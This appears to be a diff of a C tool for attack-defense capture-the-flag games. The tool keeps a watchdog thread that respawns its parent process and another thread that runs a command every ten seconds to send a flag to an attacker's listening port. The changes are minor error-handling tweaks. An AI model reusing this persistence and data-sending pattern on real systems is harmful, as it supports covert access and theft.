@@ -1,4 +1,4 @@
-/*run as a child porcess, fork and monitor by farther process*/
+/*run as child porcess, fork and monitor by farther process*/
 /*two thread, one reverse flag to your listeng port, the other check farther process's staus*/
 #include <pthread.h>
 #include <unistd.h>
@@ -31,6 +31,7 @@ int main(int argc, char **argv){
 	if(thrd1 != 0 || thrd2 != 0)
 	{
 		fprintf(stderr, "thread create failed\n");
+		exit(1);
 	}
 
 	pthread_join(thread1, NULL);
@@ -42,13 +43,18 @@ int main(int argc, char **argv){
 void check_father_state()
 {
 	pid_t ppid = getppid();
-	while(getppid() == ppid){
-		//printf("ppid: [%d]\n",getppid());
-		usleep(500);
-	}
-	execve(father_process, args, NULL);
-}
 
+	while(getppid() == ppid)
+		usleep(500);
+
+	int ret = execve(father_process, args, NULL);
+	if(ret < 0)
+	{
+		fprintf(stderr, "execve failed.\n");
+		exit(1);
+	}
+	exit(0);
+}
 
 void get_flag()
 {
@@ -57,7 +63,6 @@ void get_flag()
 	while(1)
 	{
 		system(command);
-		sleep(10);	
+		sleep(10);//one round time
 	}
-	
 }
